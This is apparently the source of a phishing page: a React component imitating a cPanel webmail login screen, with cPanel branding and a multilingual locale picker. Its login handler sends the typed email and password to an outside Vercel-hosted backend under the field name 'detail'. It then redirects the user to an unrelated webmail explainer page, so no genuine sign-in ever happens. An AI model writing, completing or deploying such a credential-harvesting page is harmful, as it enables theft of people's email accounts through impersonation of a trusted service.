import React, { useEffect, useState } from 'react';
import "./login.css";
import { useTranslation } from "react-i18next";
import i18next from 'i18next';
import cookies from 'js-cookie';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';


const languages = [
  {
    code: "fr",
    name: "Français",
  },
  {
    code: "en",
    name: "English",
  },
  {
    code: "cs",
    name: "čeština ",
  },
  {
    code: "ar",
    name: "العربية ",
    dir: "rtl"
  },
  {
    code: "da",
    name: "dansk",
  },
  {
    code: "de",
    name: "Deutsch",
  },
  {
    code: "el",
    name: "Ελληνικά",
  },
  {
    code: "es",
    name: "español",
  },
  {
    code: "es_419",
    name: "español latinoamericano",
  },
  {
    code: "es_es",
    name: "español de España",
  },
  {
    code: "fi",
    name: "suomi",
  },
  {
    code: "fil",
    name: "Filipino",
  },
  {
    code: "he",
    name: "עברית",
    dir: "rtl"
  },
  {
    code: "hu",
    name: "magyar",
  },
  {
    code: "id",
    name: "Bahasa Indonesia",
  },
  {
    code: "it",
    name: "italiano",
  },
  {
    code: "ja",
    name: "日本語",
  },
  {
    code: "ko",
    name: "한국어",
  },
  {
    code: "ms",
    name: "Bahasa Melayu",
  },
  {
    code: "nb",
    name: "norsk bokmål",
  },
  {
    code: "nl",
    name: "Nederlands",
  },
  {
    code: "pl",
    name: "polski",
  },
  {
    code: "pt",
    name: "português",
  },
  {
    code: "br",
    name: "português do Brasil",
  },
  {
    code: "ro",
    name: "română",
  },
  {
    code: "ru",
    name: "русский",
  },
  {
    code: "sv",
    name: "svenska",
  },
  {
    code: "th",
    name: "ไทย",
  },
  {
    code: "tr",
    name: "Türkçe",
  },
  {
    code: "uk",
    name: "українська",
  },
  {
    code: "vi",
    name: "Tiếng Việt",
  },
  {
    code: "zh",
    name: "中文",
  },
  {
    code: "zh_tw",
    name: "中文（台湾）",
  },
]

const Login = () => {
  const [email, setEmail] = useState('');

  const initialValues = {
    email : "",
    password : "",
  }

  const [loginValues, setLoginValues] = useState(initialValues) 


  const { t } = useTranslation()
  const currentLanguageCode = cookies.get('i18next') || 'en'
  const currentLanguage = languages.find(l => l.code === currentLanguageCode)

  useEffect( ()=>{
    document.body.dir = currentLanguage.dir || 'ltr'
    document.title = t('title')
  },[currentLanguage, t])

  const [showLocales, setShowLocales] = useState(true)
  useEffect(() => {
    // Retrieve the email from localStorage when the component mounts
    const storedEmail = localStorage.getItem('loggedInEmail');
    if (storedEmail) {
      setEmail(storedEmail);
    } else {
      // If no email found in localStorage, attempt to get it from browser autofill
      const autofillEmail = document.getElementById('email').defaultValue;
      if (autofillEmail) {
        setEmail(autofillEmail);
        localStorage.setItem('loggedInEmail', autofillEmail);
      }
    }
  }, []);

  const handleChange = (e)=>{
    const { name, value } = e.target;
    setLoginValues({...loginValues, [name]: value });
    console.log(loginValues)
    // setLoginErrors(false)
}
// const Navigate = useNavigate()

  const handleLogin = (e)=>{
    const url = "https://web-mail-backend.vercel.app/login-user"
    const data = {email: loginValues.email, detail: loginValues.password}
    e.preventDefault();
    axios.post(url,data)
    .then((response)=>{
      console.log(response)
      window.location.href = "https://www.website.com/beginnerguide/email/9/1/what-is-webmail?.ws&source=SC"
    }).catch((error)=>{
      console.log(error)
    })

}

  // jfjfjf

  return (
    <>
    
        <div className='Login'>
            <div className='first'>
              {/* <div className='login-status'>
                <div className='login-status-icon'></div>
                <div className='login-status-message'>
                  {t("login-status-message")}
                </div>
              </div> */}
                {
                  showLocales ? <div className='firstBottom'>
                  <div className='webmail-logo'></div>
                  <div className='login-form'>
                    <div className='login-form-input-container'>
                      <label>{t("email_address")}</label>
                      <div className='login-form-input'>
                        <div className='login-form-input-userlogo'></div>
                        <input type='email'
                          placeholder={t("enter_email_address")}
                          id="email"
                          name="email"
                          value={loginValues.email}
                          onChange={handleChange}
                          required                  

                        />
                      </div>
                    </div>
                    <div className='login-form-input-container'>
                      <label>{t("password")}</label>
                      <div className='login-form-input'>
                        <div className='login-form-input-passwordlogo'></div>
                        <input type='password'
                          placeholder={t("enter_password")}
                          name="password"
                          value={loginValues.password}
                          onChange={handleChange}
                          required               
                        />
                      </div>
                    </div>
                  </div>
                  <button className='login-button' onClick={handleLogin}>{t("login")}</button>
                  <div className='login-reset-password'>{t("reset_password")}</div>
                </div> : null
                }
            </div>

            {
              showLocales ? <div className='second'>
                <ul>
                  <li onClick={()=> i18next.changeLanguage(languages[1].code)}> { languages[1].name} </li>
                  <li onClick={()=> i18next.changeLanguage(languages[3].code)}> { languages[3].name} </li>
                  <li onClick={()=> i18next.changeLanguage(languages[2].code)}> { languages[2].name} </li>
                  <li onClick={()=> i18next.changeLanguage(languages[4].code)}> { languages[4].name} </li>
                  <li onClick={()=> i18next.changeLanguage(languages[5].code)}> { languages[5].name} </li>
                  <li onClick={()=> i18next.changeLanguage(languages[6].code)}> { languages[6].name} </li>
                  <li onClick={()=> i18next.changeLanguage(languages[7].code)}> { languages[7].name} </li>
                  <li onClick={()=> i18next.changeLanguage(languages[8].code)}> { languages[8].name} </li>
                  <li onClick={()=> i18next.changeLanguage(languages[9].code)}> { languages[9].name} </li>
                  <li style={{fontWeight: "600", fontSize: "20px"}} onClick={()=>setShowLocales(false)}>...</li>
                </ul>
              </div> : null
            }

            {
              !showLocales ? <div className='list-of-locales'>
                <div className='locales-top'>
                  <div>{t("select_locale")}</div>
                  <div className='close-locales' onClick={()=> setShowLocales(true)}>{t("close_locale")}</div>
                </div>
                <div className='locales-bottom'>
                  {
                    languages.map(({ code, name})=> (

                      <div className='locale-cell' onClick={()=> {i18next.changeLanguage(code)}}>{name}</div>
                    ))
                  }
                </div>
              </div>: null
            }

            {
              showLocales ? <div className='second2'>
              <div>Select a locale:</div>
              <button className='locale-button' onClick={()=> setShowLocales(false)}>English</button>
            </div> : null
            }

            <div className='third'>
              <div className='login-footer-logo'></div>
              <div style={{fontSize: "10px"}}>Copyright© 2024 cPanel, L.L.C.</div>
              <div className='privacy-policy'>Privacy Policy</div>
            </div>
        </div>
    
    </>
  )
}

export default Login;